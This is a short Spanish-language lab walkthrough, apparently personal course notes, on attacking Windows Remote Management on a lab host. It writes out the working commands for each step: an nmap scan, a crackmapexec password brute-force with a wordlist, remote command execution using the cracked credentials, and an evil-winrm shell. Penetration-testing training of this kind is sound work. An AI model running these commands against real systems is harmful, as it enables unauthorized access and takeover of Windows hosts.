Vamos a explotar el protocolo WInRM, para ello hay que tener en cuenta que el escaneo no puede ser el comun ya que no entra dentro de los 1000 puertos mas comunes, para ello realizaremos el siguiente comandos
nmap -sV -p 5985 10.2.28.238
![[Pasted image 20240308120426.png]]

Ejecutamos crackmapexec
```
crackmapexec
```
![[Pasted image 20240308123726.png]]

Ahora ejecutaremos un ataque de fuerza bruta con crackmapexec para descubrir la contraseña del usuario administrador
```
crackmapexec winrm 10.2.28.238 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
![[Pasted image 20240308124015.png]]
![[Pasted image 20240308124123.png]]

Una vez obtenemos las credenciales podemos utilizar esta herramienta para ejecutar comandos, por ejemplo vamos a ejecutar whoami
```
crackmapexec winrm 10.2.28.238 -u administrador -p tinkerbell -x "whoami"
```
![[Pasted image 20240308124509.png]]

Ahora solicitaremos infomación del sistema
![[Pasted image 20240308124605.png]]

Ahora ejecutaremos la herramienta evilwinrm para obtener una sesion shell y como podemos ver ya tenemos una sesión shell 
```Shell
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.28.238
```
![[Pasted image 20240308125010.png]]


